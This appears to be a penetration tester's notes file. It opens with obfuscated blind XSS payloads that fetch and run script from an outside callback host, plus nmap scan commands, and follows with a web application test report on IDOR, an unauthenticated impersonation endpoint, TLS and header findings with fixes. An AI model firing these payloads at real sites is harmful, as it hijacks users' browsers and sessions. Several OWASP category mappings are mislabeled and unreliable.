javascript:eval('var a=document.createElement('script');a.src='https://deadlyagent.bxss.in';document.body.appendChild(a)')
"><script src=https://deadlyagent.bxss.in></script>
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; autofocus>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61;>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61;>
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;deadlyagent.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
<script src=https://deadlyagent.bxss.in></script>
https://e5kmcagyqscb83fr25my5xz2etkk8awz.oastify.com
nmap -p 443 -sV -sC --script "ssl-* and http-* and vuln" --script-args http.useragent="Mozilla/5.0",http.max-cache-size=100 --version-all -Pn -T4 -oA nmap_443_full <target>
nmap -p 443 -sV --script ssl-enum-ciphers,ssl-cert,http-methods,http-headers,http-title,vulners -T4 -Pn <target>





-------------------------------------------------------
Issue Name: Insecure Direct Object Reference (IDOR)
The test team observed that the application is vulnerable to Insecure Direct Object Reference (IDOR).

In the current scenario, the test team found that the endpoint POST /api/scorecard/<userid>/add/<points> allows direct manipulation of user IDs and point values. By incrementing the user ID from U338347 to U338348, the test team was able to add 1000 points to another user’s account without authentication or authorization. This endpoint accepts any point value and applies it directly to the specified user’s score, making it possible to arbitrarily increase another user's score without their knowledge.

The attacker can manipulate user scores by modifying the user ID and assigning any number of points, leading to unfair advantages, reputation manipulation, or abuse of reward-based features. This undermines trust in the platform’s scoring system and may impact business credibility or revenue if rewards are tied to score metrics.

Severity: High
Recommendations:
It is recommended to:
Implement proper access control to ensure users can only modify their own scores.
Validate that the user making the request matches the user ID in the API path using server-side checks.
Do not rely on client-supplied data (like user ID or point value) for authorization-sensitive operations.
Maintain a secure server-side mapping between authenticated sessions and user actions, preventing actions on behalf of other users.
OWASP Top 10 2021 Mapping: A01:2021 – Broken Access Control
CVSS 3.1 Score: 8.7 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N
CWE Reference: CWE-639: Authorization Bypass Through User-Controlled Key

---------------------------------------------------------------------
Account Takeover via Unauthenticated Impersonation API
Description:
The test team observed that the application is vulnerable to Account Takeover via an unauthenticated impersonation endpoint.

Observation:
In the current scenario, the test team found that sending an unauthenticated GET request to the endpoint /api/impersonate?email=<email> returns sensitive user session information, including authentication cookies. By supplying a valid user's email address, the team was able to retrieve session-related details and use them to gain full access to the target user’s account. This access allowed viewing, modifying, and performing privileged operations as the victim without their knowledge or consent.

Risk Impact:
The attacker can log in as any user, take full control of their account, access sensitive personal data, modify settings, and perform actions on their behalf. This leads to a complete compromise of user privacy, loss of data integrity, and potentially full application compromise if used against admin accounts.

Severity: High
Recommendations:
It is recommended to:
Remove or properly restrict access to the /api/impersonate endpoint; if needed for admin use, enforce strict role-based access control and authentication.
Validate authentication and authorization for all sensitive operations, especially impersonation or administrative actions.
Apply these protections wherever impersonation, debugging, or privileged operations are handled throughout the application.
CVSS 3.1 Score: 8.2 (High)
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
OWASP Top 10 2021 Mapping: A01:2021 – Broken Access Control
CWE Reference: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
Additional CWE: CWE-306: Missing Authentication for Critical Function
----------------------------------------------------------------------------------------------------------
Swagger API Documentation Disclosure
Description:
The test team observed that the application exposes Swagger API documentation publicly.

Observation:
In the current scenario, the test team found that the Swagger UI and API documentation were disclosed. This interface displays a full list of available API endpoints along with descriptions, request methods and parameter names. Anyone accessing the application can view the full backend structure and identify sensitive or undocumented endpoints.

Risk Impact:
The attacker can gain insights into all available API routes, including admin or internal endpoints, which can assist in planning further attacks such as unauthorized access, fuzzing, or automated exploitation.

Severity: Medium
Recommendations:
It is recommended to:
Restrict access to Swagger UI and API documentation using authentication or IP whitelisting.
Remove or disable API documentation in production environments.
OWASP Top 10 2021 Mapping: A06:2021 – Vulnerable and Outdated Components
CVSS 3.1 Score: 6.5 (Medium)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
CWE Reference: CWE-668: Exposure of Resource to Wrong Sphere
-----------------------------------------------------------------------------------------------------
Issue Name: Use of Weak and Deprecated SSL/TLS Ciphers
Description:
The test team observed that the application accepts SSL/TLS ciphers that are considered weak and vulnerable to known cryptographic attacks.

Observation:
In the current scenario, the test team found that the server supports encryption algorithms vulnerable to known attacks such as SWEET32 and LUCKY13. It also allows connections over deprecated SSL/TLS protocol versions including TLS 1.0 and TLS 1.1. These configurations weaken the overall security posture and may allow attackers to exploit weaknesses in the encryption layer under certain conditions.

Risk Impact:
The attacker can exploit cryptographic flaws to recover partial plaintext or perform downgrade attacks, especially when large volumes of encrypted data are exchanged. Support for outdated protocols also makes the application non-compliant with modern security standards.

Severity: Medium
Recommendations:
It is recommended to:
Disable support for all known weak ciphers vulnerable to SWEET32 and LUCKY13.
Remove support for TLS 1.0 and TLS 1.1 entirely and allow only TLS 1.2 or TLS 1.3.
Enforce server-side cipher preference to avoid client-triggered downgrade attacks.
Prefer modern AEAD-based ciphers such as GCM-mode over legacy CBC-based ciphers.
OWASP Top 10 2021 Mapping: A02:2021 – Cryptographic Failures
CVSS 3.1 Score: 6.5 (Medium)
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
CWE Reference:
CWE-326: Inadequate Encryption Strength
CWE-327: Use of Broken or Risky Cryptographic Algorithm
CWE-319: Cleartext Transmission of Sensitive Information
-------------------------------------------------------------------------------------------------------
Issue Name: Business Logic Bypass in Reward Points Allocation
Description:
The test team observed that the application is vulnerable to Business Logic Bypass in the reward points system.

Observation:
In the current scenario, the test team found that after completing an onboarding task, the application calls a backend endpoint to add predefined reward points. By intercepting the request to POST /api/scorecard/<userid>/add/<points> and modifying the point value in transit, the team was able to assign arbitrary values, including very large or negative numbers, to their account. This led to either inflated rewards or manipulation of the overall score, bypassing the intended logic of the reward system.

Risk Impact:
The attacker can manipulate their reward points to gain unfair advantages, reduce other users' scores (in case of negative value injection), or break gamification/incentive-based features. This undermines platform integrity, may affect competitive fairness, and could result in financial or reputational damage if rewards are tied to scores.

Severity: High
Recommendations:
It is recommended to:
Implement strict server-side validation to ensure only allowed point values (e.g., fixed per-task) are accepted.
Ignore or reject any client-supplied values that are not part of the system's business rules.
Use internal mappings on the server to associate tasks with fixed point values rather than trusting the client’s input.
Implement input sanitization to reject negative or excessively high values.
Apply this logic throughout the application on all endpoints where point or credit values are accepted, calculated, or stored, especially those tied to user rewards or incentives.
OWASP Top 10 2021 Mapping: A05:2021 – Security Misconfiguration
CWE Reference:
CWE-840: Business Logic Errors
CWE-285: Improper Authorization
CWE-1284: Improper Validation of Specified Quantity in Input
CVSS 3.1 Score: 3.7 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
-----------------------------------------------------------------------------------------------------
Issue Name: Absence of Rate Limiting
Description:
The test team observed that the application does not implement rate limiting.
Observation:
In the current scenario, the test team found that it was possible to submit a large number of feedback requests in a very short period. Specifically, over 100 feedback entries were submitted within 5 seconds without triggering any throttling, delay, or blocking response. This confirms that there are no rate-limiting mechanisms in place to prevent automated or abusive submissions.

Risk Impact:
The attacker can abuse this flaw to flood the system with fake or spam feedback, which could degrade the quality of analytics, disrupt moderation workflows, or impact performance.

Severity: Medium
Recommendations:
It is recommended to:
Implement rate limiting on the feedback submission endpoint to restrict the number of requests per IP or user in a given time window.
Use token bucket or sliding window algorithms to manage request bursts.
Return appropriate HTTP status codes like 429 Too Many Requests when limits are exceeded.
Apply rate limiting across all endpoints where resource consumption, submissions, or sensitive operations are involved.
OWASP Top 10 2021 Mapping: A10:2021 – Server-Side Request Forgery (SSRF)
(Note: OWASP doesn’t list rate limiting as a standalone issue, but it is relevant to misconfigurations and abuse of application functionality.)
CVSS 3.1 Score: 5.3 (Medium)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
CWE Reference:
CWE-770: Allocation of Resources Without Limits or Throttling
---------------------------------------------------------------------------------------------------------------
Issue Name: Improper Error handling
Description:
The test team observed that the application reveals internal error messages when invalid input is submitted.

Observation:
In the current scenario, the test team submitted invalid values to the cardID parameter and received detailed error messages in the response. These error messages included stack traces which are not intended to be exposed to end-users.

Risk Impact:
The attacker can gain insights into the application's internal structure, libraries, and logic flow, which may aid in crafting further attacks such as injection, path traversal, or targeted fuzzing.

Severity: Low
Recommendations:
It is recommended to:
Disable detailed error messages in production environments.
Implement a generic error-handling mechanism that returns user-friendly messages without revealing stack traces or internal logic.
Apply this sanitization across all endpoints where user input is processed and exceptions may occur.
OWASP Top 10 2021 Mapping: A01:2021 – Broken Access Control
(Relates to excessive information exposure during failed requests)

CVSS 3.1 Score: 3.3 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Reference:
CWE-209: Generation of Error Message Containing Sensitive Information
--------------------------------------------------------------------------------------------
Issue Name: Server Information Disclosure via HTTP Response Headers
Description:
The test team observed that the application discloses server-related information in HTTP response headers.

Observation:
In the current scenario, the test team identified that the server includes the following response headers:

Server: Microsoft-IIS/10.0

X-Powered-By: ASP.NET
These headers expose underlying server and framework details to the client, which can help an attacker identify technologies in use and tailor further attacks accordingly.

Risk Impact:
The attacker can use disclosed server details to fingerprint the underlying infrastructure and exploit known vulnerabilities specific to those technologies.

Severity: Low
Recommendations:
It is recommended to:
Remove or obfuscate the Server and X-Powered-By headers from HTTP responses.
Use web server configuration (e.g., IIS, Apache, NGINX) to suppress or replace these headers.
OWASP Top 10 2021 Mapping: A06:2021 – Vulnerable and Outdated Components
CVSS 3.1 Score: 3.1 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
CWE Reference:
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
-----------------------------------------------------
HSTS Misconfiguration (max-age = 0)
Description:
The test team observed that the HTTP Strict Transport Security (HSTS) header is misconfigured.

Observation:
In the current scenario, the response includes the header:
Strict-Transport-Security: max-age=0
This configuration disables the HSTS policy and fails to enforce HTTPS-only communication in browsers after the first secure request.

Risk Impact:
The attacker can exploit this misconfiguration in a downgrade or man-in-the-middle attack, forcing users onto HTTP versions of the site, potentially exposing sensitive data.

Severity: Low
Recommendations:
It is recommended to:
Set the HSTS header properly as:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Ensure this is applied consistently across all domains and subdomains.
Validate the server does not send conflicting or insecure overrides.

OWASP Top 10 2021 Mapping: A06:2021 – Vulnerable and Outdated Components
CVSS 3.1 Score: 3.1 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
CWE Reference:
CWE-319: Cleartext Transmission of Sensitive Information
CWE-693: Protection Mechanism Failure
-----------------------------------------------------------------
Issue 1: Missing Security Headers
Description:
The test team observed that the application does not return standard security-related HTTP headers.

Observation:
In the current scenario, the test team found that the HTTP response is missing key security headers such as X-Content-Type-Options, X-Frame-Options, and Referrer-Policy. The absence of these headers reduces browser-enforced protection against common web attacks.

Risk Impact:
The attacker can exploit missing browser directives to perform attacks such as MIME sniffing, clickjacking, or referrer data leakage.

Severity: Low
Recommendations:
It is recommended to:
Add X-Content-Type-Options: nosniff to prevent MIME-type sniffing.
Add X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking.
Add Referrer-Policy: no-referrer or a stricter policy to control referrer leakage.
Apply these headers across all environments and endpoints consistently.

OWASP Top 10 2021 Mapping: A06:2021 – Vulnerable and Outdated Components
CVSS 3.1 Score: 3.0 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Reference:
CWE-693: Protection Mechanism Failure
----------------------------------------------------------------------
Issue 2: Missing Content Security Policy (CSP)
Description:
The test team observed that the application does not implement a Content Security Policy.

Observation:
In the current scenario, the test team found that no Content-Security-Policy header is present in the HTTP responses. However, since the application does not render user-supplied input or dynamic HTML content, the immediate risk of script injection is low.

Risk Impact:
The attacker can potentially inject unauthorized scripts if a client-side vulnerability arises in the future. Lack of CSP makes the browser unable to restrict source origins, increasing XSS exploitability when combined with other flaws.

Severity: Low
Recommendations:
It is recommended to:
Although the app does not currently render user input, it's best practice to implement a basic CSP as a defense-in-depth measure.
Define a minimal policy such as:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
Apply CSP especially in future components that may introduce dynamic content or third-party scripts.

OWASP Top 10 2021 Mapping: A05:2021 – Security Misconfiguration
CVSS 3.1 Score: 3.1 (Low)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Reference:
CWE-693: Protection Mechanism Failure
